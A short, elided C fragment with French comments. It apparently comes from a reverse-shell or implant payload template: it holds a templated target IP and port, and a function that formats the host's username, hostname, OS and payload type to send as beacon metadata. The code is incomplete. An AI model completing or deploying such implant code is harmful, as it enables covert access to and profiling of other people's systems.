...
const char *target = "{{TARGET_IP}}:{{TARGET_PORT}}";
...
void handle_metadata_request(int sockfd) {
    ...
    // Assurez-vous que le format est correct: USERNAME|HOSTNAME|OS|PAYLOAD_TYPE
    // Évitez les valeurs vides
    if (strlen(username) == 0) strcpy(username, "unknown");
    if (strlen(hostname) == 0) strcpy(hostname, "unknown");

    char metadata[512];
    snprintf(metadata, sizeof(metadata), "%s|%s|%s|C\n", username, hostname, os);
